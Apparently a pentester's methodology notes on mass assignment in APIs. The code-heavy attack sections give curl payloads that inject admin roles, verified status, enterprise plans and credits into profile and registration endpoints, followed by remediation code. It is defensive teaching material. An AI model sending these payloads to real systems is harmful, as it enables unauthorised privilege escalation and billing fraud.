# Mass Assignment — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API3:2023 Broken Object Property Level Authorization
>
> **Severity:** High to Critical — privilege escalation, account manipulation, business logic bypass
>
> **Real-world impact:** Mass assignment is the vulnerability that developers consistently forget to protect because it requires understanding what should NOT be accepted, not just what should be. An API that correctly handles the 5 documented fields in the UI form may silently accept 12 additional fields that the developer never expected users to send — including `role`, `is_admin`, `plan`, and `credits`. In enterprise engagements, I find mass assignment most reliably at registration endpoints and profile update endpoints. Teams harden the endpoints they think about. They forget the ones they built under deadline pressure two years ago.

---

## 🧠 Why Mass Assignment Persists in Enterprise APIs

```
The developer pattern that causes mass assignment:

// Framework auto-binding (the convenience that becomes a vulnerability):
// ASP.NET Model Binding:
[HttpPost]
public async Task<IActionResult> UpdateProfile([FromBody] UserProfile profile)
{
    // Framework binds ALL JSON fields to UserProfile object
    // If UserProfile has: Name, Email, Role, IsAdmin, CreditBalance
    // And attacker sends:  {"name":"x","email":"y","role":"admin","isAdmin":true}
    // ALL fields get set — including the ones the UI form never showed
    await _repo.UpdateAsync(profile);
    return Ok(profile);
}

// Django REST Framework:
class UserUpdateView(UpdateAPIView):
    serializer_class = UserSerializer  # ← if serializer has all fields
    # Developer didn't add read_only_fields = ['role', 'is_admin']
    # Every field in the serializer is writable

// Spring Boot:
@PutMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @RequestBody User user)
{
    // @RequestBody User binds ALL JSON to the User entity
    // Including: role, isAdmin, subscriptionPlan, creditBalance
}

The root cause is not malice — it is convenience.
Framework auto-binding is powerful for rapid development.
Without explicit field whitelisting, that convenience becomes an attack vector.
```

---

## 🔍 Phase 1 — Finding Mass Assignment Candidates

### Step 1: Document All Fields the Application Actually Stores

```bash
# Get your own profile — see EVERYTHING the API stores about you
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" | jq .

# Sample output — this is your mass assignment target list:
{
  "id": 1099,
  "name": "Dheeraj Jayaswal",          ← displayed in UI, editable
  "email": "dheeraj@company.com",       ← displayed in UI, editable
  "phone": "9201734341",                ← displayed in UI, editable
  "role": "user",                       ← NOT editable via UI ← TARGET
  "is_admin": false,                    ← NOT editable via UI ← TARGET
  "is_verified": false,                 ← NOT editable via UI ← TARGET
  "subscription_plan": "basic",         ← NOT editable via UI ← TARGET
  "credit_balance": 0,                  ← NOT editable via UI ← TARGET
  "internal_notes": "",                 ← NOT shown in UI at all ← TARGET
  "created_at": "2024-01-15T10:30:00Z",
  "account_type": "standard"            ← NOT editable via UI ← TARGET
}

# Rule: any field in the GET response that is NOT editable via the UI
# is a mass assignment injection target for the PUT/PATCH endpoint
```

### Step 2: Identify All Update/Create Endpoints

```bash
# Endpoints to test for mass assignment:
# Any endpoint that accepts user-controlled data in the body:
# POST /register, /users, /accounts
# PUT  /users/me, /users/{id}, /profile
# PATCH /users/me, /profile/update
# POST /settings/update

# Also test at registration — most commonly missed:
# POST /api/v1/auth/register
# POST /api/v1/users/create
# POST /api/v1/accounts/signup
```

---

## 💥 Phase 2 — Attack Vectors

### Attack 1 — Privilege Escalation via Role Field

```bash
# Standard profile update — inject role field:
curl -s -X PUT https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Dheeraj",
    "email": "dheeraj@company.com",
    "role": "admin",
    "is_admin": true
  }' | jq .

# Verify if escalation worked:
curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" | jq '{role, is_admin}'

# Expected: {"role": "user", "is_admin": false}
# Critical finding if: {"role": "admin", "is_admin": true}

# Test accessing admin endpoints after successful escalation:
curl -so /dev/null -w "Admin panel after escalation: %{http_code}\n" \
  https://api.company.com/api/v1/admin/users \
  -H "Authorization: Bearer TOKEN"
# If 200 = full privilege escalation demonstrated = Critical
```

### Attack 2 — Mass Assignment at Registration (Most Missed)

```bash
# Registration endpoint — inject privileged fields at account creation:
curl -s -X POST https://api.company.com/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "newuser@test.com",
    "password": "Test123!",
    "name": "Test User",
    "role": "admin",
    "is_admin": true,
    "subscription_plan": "enterprise",
    "credit_balance": 99999,
    "is_verified": true,
    "account_type": "premium"
  }' | jq .

# Login with the new account and check what role was assigned:
TOKEN=$(curl -s -X POST https://api.company.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"newuser@test.com","password":"Test123!"}' | \
  jq -r '.access_token')

curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" | \
  jq '{role, is_admin, subscription_plan, credit_balance, is_verified}'

# Any privileged field accepted at registration = Critical
```

### Attack 3 — Subscription / Business Logic Bypass

```bash
# Bypass paid subscription tiers:
curl -s -X PUT https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Dheeraj",
    "subscription_plan": "enterprise",
    "subscription_expiry": "2099-12-31",
    "credit_balance": 999999,
    "api_rate_limit": 100000
  }' | jq .

# Check if premium features are now accessible:
curl -so /dev/null -w "Enterprise export: %{http_code}\n" \
  https://api.company.com/api/v1/export/enterprise-format \
  -H "Authorization: Bearer TOKEN"
# If 200 = paid feature accessed for free = High finding
```

### Attack 4 — Account Verification Bypass

```bash
# Bypass email verification requirement:
curl -s -X PATCH https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_verified": true, "email_verified_at": "2024-01-01T00:00:00Z"}' | jq .

# Check if verification-gated features are now accessible
```

### Attack 5 — Mass Assignment in Nested Objects

```bash
# APIs with nested objects — test nested privileged fields too:
curl -s -X PUT https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "profile": {
      "name": "Dheeraj",
      "bio": "Penetration tester"
    },
    "account": {
      "role": "admin",
      "tier": "enterprise"
    },
    "permissions": {
      "can_admin": true,
      "can_export_all": true
    }
  }' | jq .
```

---

## 🔬 Systematic Field Discovery Techniques

### Compare All Fields Across API Responses

```bash
python3 << 'PYEOF'
import subprocess, json

# Get full user object (all stored fields)
result = subprocess.run([
    'curl', '-s', 'https://api.company.com/api/v1/users/me',
    '-H', 'Authorization: Bearer TOKEN'
], capture_output=True, text=True)

user_fields = set(json.loads(result.stdout).keys())

# Fields the UI form exposes (you determined manually from the UI):
ui_fields = {'name', 'email', 'phone', 'bio'}

# Non-UI fields = mass assignment targets:
targets = user_fields - ui_fields
print("Mass assignment injection targets:")
for field in sorted(targets):
    print(f"  → {field}")
PYEOF
```

### Extract Target Fields From Swagger Schema

```bash
# If Swagger spec is available — mine it for privileged fields:
cat swagger_v2.json | jq -r '
  .definitions.UserUpdateRequest.properties // {} | keys[]
' | sort
# This shows DOCUMENTED update fields

cat swagger_v2.json | jq -r '
  .definitions.User.properties // {} | keys[]
' | sort
# This shows ALL fields in the User model

# The DIFFERENCE between these two lists = mass assignment targets
```

---

## 🗂️ Systematic Testing Checklist

```
FIELD DISCOVERY
☐ GET /users/me → document ALL fields in response
☐ Compare against fields editable via UI → identify targets
☐ Check Swagger spec: User model fields vs UpdateRequest fields
☐ Look for: role, is_admin, plan, credits, verified, account_type, permissions

ENDPOINT COVERAGE
☐ PUT /users/me — standard profile update
☐ PATCH /users/me — partial update
☐ POST /auth/register — registration (most commonly vulnerable)
☐ POST /users — admin user creation
☐ PUT /users/{id} — BOLA + mass assignment combined
☐ POST /accounts/create — account creation flow

INJECTION TARGETS (test all simultaneously)
☐ role: "admin"
☐ is_admin: true
☐ is_verified: true
☐ subscription_plan: "enterprise"
☐ credit_balance: 99999
☐ account_type: "premium"
☐ internal_notes: "test"
☐ email_verified_at: "2024-01-01"

VERIFICATION
☐ After injection: GET /users/me → check if fields changed
☐ Test access to privileged functions if role changed
☐ Test access to enterprise features if plan changed
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Mass Assignment at Registration — Administrator Account Creation Without Credentials

**Severity:** Critical | **CVSS v3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Affected Endpoint:** `POST /api/v1/auth/register`

```
Registration request with injected privileged fields:
  curl -s -X POST https://api.company.com/api/v1/auth/register \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com","password":"Test123!","name":"Attacker",
         "role":"admin","is_admin":true,"subscription_plan":"enterprise"}'

  Response: HTTP 201 Created
  {"id":5201,"email":"attacker@evil.com","role":"admin","is_admin":true}

Verification — admin access confirmed:
  curl -s https://api.company.com/api/v1/admin/users \
    -H "Authorization: Bearer [NEW_ACCOUNT_TOKEN]"
  → HTTP 200: Returns full user database (4,200 records)

Impact:
  Any unauthenticated actor can register an account with administrator
  privileges by including role=admin in the registration request body.
  No existing credentials, social engineering, or technical exploitation
  required — only knowledge of the registration API endpoint.

Remediation:
  // ✅ ASP.NET Core — use separate DTO for registration
  public class RegisterRequest {
      public string Name { get; set; }
      public string Email { get; set; }
      public string Password { get; set; }
      // Role, IsAdmin, SubscriptionPlan NOT present → cannot be bound
  }

  // Apply [BindNever] to privileged fields on entity:
  [BindNever] public string Role { get; set; } = "user";
  [BindNever] public bool IsAdmin { get; set; } = false;
```

---

## 🧭 Key Takeaways

**1. Registration is the most consistently overlooked mass assignment endpoint.**
Teams review and harden the profile update endpoint after it is flagged in a pentest or bug report. They almost never go back and apply the same fix to the registration endpoint. Every engagement, test registration first.

**2. The GET response is your injection field list.**
Any field that appears in the GET response but is not present in the UI form is a mass assignment candidate for the PUT/PATCH endpoint. No Swagger spec needed — just compare what the API returns against what the UI shows.

**3. Combined BOLA + mass assignment = Critical.**
If the application is vulnerable to BOLA (any user can update any other user's profile) AND mass assignment (role field is accepted) — the combination means any authenticated user can escalate any account to admin. Document the chain, not just the individual findings.

---

## 🔗 References
- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [PortSwigger Mass Assignment](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
